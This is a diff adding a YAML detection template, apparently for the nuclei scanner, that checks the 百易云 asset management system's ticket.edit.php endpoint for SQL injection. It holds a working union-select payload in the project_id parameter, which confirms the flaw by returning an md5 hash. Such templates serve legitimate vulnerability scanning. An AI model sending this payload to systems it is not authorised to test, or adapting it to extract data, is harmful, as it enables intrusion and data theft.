@@ -1,0 +1,28 @@
+id: poc-yaml-baiyishequ-ticket-edit-sqli
+info:
+  name: 百易云资产管理运营系统 ticket.edit.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    百易云资产管理运营系统 ticket.edit.php endpoint is vulnerable to SQL Injection which may lead to sensitive data exposure.
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/adminx/ticket.edit.php?project_id=-1%20union+select+1,md5({{t1}}),3,4,5--+"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
+      - type: word
+        words:
+          - "工单来源"
+        part: body
